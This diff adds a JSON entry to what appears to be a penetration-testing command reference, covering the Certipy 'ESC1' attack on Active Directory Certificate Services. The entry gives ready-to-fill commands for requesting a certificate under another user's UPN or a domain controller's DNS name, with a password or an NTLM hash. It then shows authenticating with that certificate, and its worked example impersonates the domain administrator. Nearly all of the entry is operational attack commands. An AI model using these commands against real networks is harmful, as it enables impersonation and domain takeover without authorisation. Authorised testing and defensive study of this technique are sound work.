@@ -1,0 +1,23 @@
+{
+  "id": "certipy-esc1",
+  "name": "Certipy ESC1 (Subject in Request)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<vulnerable_template>' -upn '<target_user>@<domain>'",
+  "description": "Exploit ESC1: a template that allows the requester to specify a Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT) lets you request a certificate with someone else's UPN. The resulting cert authenticates as that user.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "rpc"],
+  "tags": ["certipy", "adcs", "esc1", "upn", "san", "impersonation"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "certipy req -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<template>' -upn '<target>@<domain>'" },
+    { "label": "Then Authenticate", "requires": "no-creds", "command": "certipy auth -pfx <target>.pfx -dc-ip <dc-ip>" },
+    { "label": "DNS-based (computer SAN)", "requires": "password", "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<template>' -dns '<dc-fqdn>'" }
+  ],
+  "references": [
+    { "title": "Certipy README", "url": "https://github.com/ly4k/Certipy" },
+    { "title": "SpecterOps — ADCS Attacks", "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2" }
+  ],
+  "examples": [
+    "certipy req -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'VulnUserCert' -upn 'administrator@corp.local'",
+    "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10"
+  ]
+}
